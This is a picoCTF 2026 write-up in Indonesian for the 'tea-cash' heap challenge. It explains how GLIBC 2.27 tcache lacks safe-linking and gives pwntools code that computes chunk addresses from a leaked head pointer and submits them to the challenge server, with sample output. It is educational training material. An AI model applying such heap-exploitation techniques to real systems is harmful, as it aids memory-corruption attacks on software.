# tea-cash — picoCTF 2026 Writeup

**Category:** Binary Exploitation / Heap  
**Challenge:** tea-cash  
**Event:** picoCTF 2026

---

## Deskripsi Soal

Server menjalankan binary `heapedit` yang mengalokasikan beberapa heap chunk, membebaskannya, lalu memberikan kita alamat **tcache head** (kepala free list). Kita diminta untuk mengirimkan alamat-alamat tertentu sebagai input sebanyak 6 kali.

Tujuan: baca alamat tcache list dengan benar untuk memenuhi kondisi program dan mendapatkan flag.

---

## Vulnerabilitas

### Tcache GLIBC 2.27 Tanpa Safe-Linking

Binary dikompilasi dengan **GLIBC 2.27** yang belum memiliki proteksi **safe-linking** (baru ditambahkan di GLIBC 2.32). Artinya, `fd` pointer di setiap chunk tcache menyimpan **alamat mentah** chunk berikutnya tanpa obfuskasi.

Struktur tcache free list setelah 6 chunk dibebaskan secara terbalik:

```
chunks[0] → chunks[1] → chunks[2] → chunks[3] → chunks[4] → chunks[5] → NULL
```

Karena chunk dialokasikan secara berurutan dengan stride `0x90` (0x80 data + 0x10 header), kita bisa menghitung semua alamat hanya dari `head`:

```
chunks[i] = head + i * 0x90
```

---

## Strategi Exploit

### Step 1 — Terima Alamat Head dari Server

Server mencetak alamat kepala tcache free list (yaitu `chunks[0]`) di baris pertama output:

```
tcache head (start of free list) -> 0x...
```

Parse alamat ini:

```python
line = io.recvline().decode().strip()
head = int(line.split('-> ')[1].strip(), 16)
```

### Step 2 — Hitung Alamat Setiap Chunk

Karena chunk dialokasikan berurutan dengan stride `0x90`:

```python
chunk_stride = 0x90  # 0x80 data + 0x10 header

for i in range(6):
    addr = head + i * chunk_stride
```

### Step 3 — Kirim Setiap Alamat ke Server

Untuk setiap prompt yang diberikan server, kirimkan alamat chunk ke-`i`:

```python
for i in range(6):
    addr = head + i * chunk_stride
    io.recvuntil(b': ')
    io.sendline(hex(addr).encode())
```

Server memvalidasi bahwa kita bisa menelusuri tcache list dengan benar. Jika semua alamat tepat, flag diberikan.

---

## Cara Pakai

### Install Requirements

```bash
pip install pwntools
```

### Jalankan Exploit

```bash
# Remote
python3 exploit.py

# Local (butuh binary heapedit_patched)
python3 exploit.py local
```

---

## Contoh Output

```
[*] Connected to candy-mountain.picoctf.net:52993
[*] Received: tcache head (start of free list) -> 0x55f3a1234b40
[+] Head (chunks[0]) = 0x55f3a1234b40
[*] Chunk 1: sending 0x55f3a1234b40
[*] Chunk 2: sending 0x55f3a1234bd0
[*] Chunk 3: sending 0x55f3a1234c60
[*] Chunk 4: sending 0x55f3a1234cf0
[*] Chunk 5: sending 0x55f3a1234d80
[*] Chunk 6: sending 0x55f3a1234e10
[+] Result: Flag: picoCTF{...}

[FLAG] picoCTF{...}
```

---

## Requirements

| Library | Fungsi |
|---|---|
| `pwntools` | Koneksi socket ke server & interaksi I/O binary |

---

## Catatan

> ℹ️ Stride `0x90` berlaku untuk chunk dengan data `0x80` byte. Jika ukuran chunk berbeda di instance lain, sesuaikan stride dengan `(ukuran_data + 0x10)` dibulatkan ke kelipatan `0x10`.

> ⚠️ Safe-linking (GLIBC ≥ 2.32) mengobfuskasi `fd` pointer dengan `ptr >> 12 XOR next`. Exploit ini **tidak akan bekerja** pada binary yang dikompilasi dengan GLIBC lebih baru tanpa modifikasi.

> ℹ️ Urutan free (5,4,3,2,1,0) menghasilkan tcache list `0→1→2→3→4→5→NULL` karena tcache bersifat LIFO — chunk yang terakhir dibebaskan berada di kepala list.